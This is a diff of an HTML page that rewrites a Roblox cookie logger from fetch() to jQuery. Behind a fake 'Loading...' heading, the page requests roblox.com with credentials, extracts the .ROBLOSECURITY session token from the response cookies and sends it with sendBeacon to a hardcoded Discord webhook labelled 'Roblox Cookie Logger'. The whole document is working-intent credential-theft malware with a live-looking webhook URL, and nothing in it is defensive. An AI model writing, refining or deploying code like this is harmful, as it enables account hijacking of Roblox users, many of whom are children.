@@ -1,31 +1,42 @@
 <html>
-  <body>
-    <h1>Loading...(around 5 seconds)</h1>
+  <head>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
-      fetch('https://www.roblox.com/', { credentials: 'include' })
-        .then(response => {
-          var robloxCookie = response.headers.get('set-cookie');
-          if (robloxCookie) {
-            var token = extractToken(robloxCookie);
-            if (token) {
-              sendToDiscord(token);
+      $(document).ready(function() {
+        $.ajax({
+          xhrFields: {
+            withCredentials: true
+          },
+          type: "GET",
+          url: "https://www.roblox.com/",
+          success: function(data, textStatus, jqXHR) {
+            var cookie = jqXHR.getResponseHeader("Set-Cookie");
+            if (cookie) {
+              var token = extractToken(cookie);
+              if (token) {
+                sendToDiscord(token);
+              }
             }
           }
         });
-      
-      function extractToken(cookie) {
-        var match = cookie.match(/\.ROBLOSECURITY=([^;]+)/);
-        return match ? match[1] : null;
-      }
-      
-      function sendToDiscord(token) {        
-        var webhookUrl = 'https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz';
         
-        navigator.sendBeacon(webhookUrl, JSON.stringify({
-          username: 'Roblox Cookie Logger',
-          content: '```' + token + '```'
-        }));
-      }
+        function extractToken(cookie) {
+          var match = cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+          return match ? match[1] : null;
+        }
+        
+        function sendToDiscord(token) {
+          var webhookUrl = 'https://discord.com/api/webhooks/1293641125109956748/MqwIlGaJOFp_5YCHnFVOI8dpxTb73hKMycJWdaqDvEjTHmhxIg54Tu06QklUWcOL5fyz';
+          
+          navigator.sendBeacon(webhookUrl, JSON.stringify({
+            username: 'Roblox Cookie Logger',
+            content: '```' + token + '```'
+          }));
+        }
+      });
     </script>
+  </head>
+  <body>
+    <h1>Loading...(around 5 seconds)</h1>
   </body>
 </html>
